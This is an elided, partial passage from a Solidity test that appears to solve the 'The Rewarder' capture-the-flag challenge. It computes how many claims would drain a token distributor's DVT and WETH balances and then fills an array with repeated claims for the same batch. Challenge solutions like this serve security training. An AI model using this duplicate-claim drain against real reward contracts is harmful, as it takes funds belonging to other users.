...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        // 188 index numbver of token distribution for player address
        // Set DVT and WETH as tokens to claim
        ...
        uint256 DISTRIBUTOR_DVT_BALANCE = dvt.balanceOf(address(distributor));
        uint256 DISTRIBUTOR_WETH_BALANCE = weth.balanceOf(address(distributor));

        uint256 claimsCountDvt = DISTRIBUTOR_DVT_BALANCE /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint256 claimsCountWeth = DISTRIBUTOR_WETH_BALANCE /
            PLAYER_WETH_CLAIM_AMOUNT;

        // assertEq(claimsCountDvt, claimsCountWeth);
        ...
        // Create Alice's claims
        Claim[] memory claims = new Claim[](claimsCountDvt + claimsCountWeth);
        ...
        // 1. Populate all the DVT claims first
        for (uint256 i = 0; i < claimsCountDvt; i++) {
            // First, the DVT claim
            claims[index] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
        ...
        // 2. Populate all the WETH claims second
        for (uint256 i = 0; i < claimsCountWeth; i++) {
            claims[index] = Claim({
                batchNumber: 0, // claim corresponds to first WETH batch
